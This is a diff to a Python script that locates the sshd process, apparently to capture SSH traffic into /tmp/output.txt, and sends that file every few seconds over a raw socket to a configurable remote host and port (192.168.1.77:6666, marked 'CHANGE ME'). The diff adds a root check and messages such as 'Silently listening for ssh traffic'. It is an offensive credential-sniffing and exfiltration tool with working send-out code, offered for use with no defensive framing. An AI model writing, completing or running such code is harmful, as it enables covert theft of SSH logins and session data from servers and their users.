@@ -3,6 +3,7 @@ import os
 import time
 import socket
 import threading
+import sys
 
 def find_sshd_pid():
     result = subprocess.run(['pgrep', 'sshd'], stdout=subprocess.PIPE, text=True)
@@ -17,9 +18,9 @@ def send_data_to_remote(data, remote_host, remote_port):
         try:
             s.connect((remote_host, remote_port))
             s.sendall(data.encode())
-            print(f"Sent content of {output_file} over to {remote_host} on port {remote_port}")
+            print(f"[+] Data successfully sent to {remote_host}:{remote_port}")
         except ConnectionRefusedError:
-            pass  # Handle the connection refused error (silently)
+            pass
         except Exception as e:
             print(f"Error sending data: {e}")
 
@@ -30,14 +31,14 @@ def periodically_send_data(output_file, remote_host, remote_port, interval=5):
             file_data = file.read()
             send_data_to_remote(file_data, remote_host, remote_port)
 
-        # Open the file in write mode to overwrite the content
-        with open(output_file, 'w'):
-            pass
-
 def main():
-    output_file = "/tmp/output.txt"
-    remote_host = "192.168.1.77"
-    remote_port = 6666
+    if os.geteuid() != 0:
+        print("[X] This needs to be ran as root. Exiting..")
+        sys.exit(1)
+    print("[+] Silently listening for ssh traffic...")
+    output_file = "/tmp/output.txt" ### CHANGE ME
+    remote_host = "192.168.1.77" ### CHANGE ME
+    remote_port = 6666  ### CHANGE ME
 
     sshd_pid = find_sshd_pid()
 
@@ -58,7 +59,6 @@ def main():
 
     try:
         while True:
-            # Your main program logic can go here
             time.sleep(1)
     except KeyboardInterrupt:
         pass
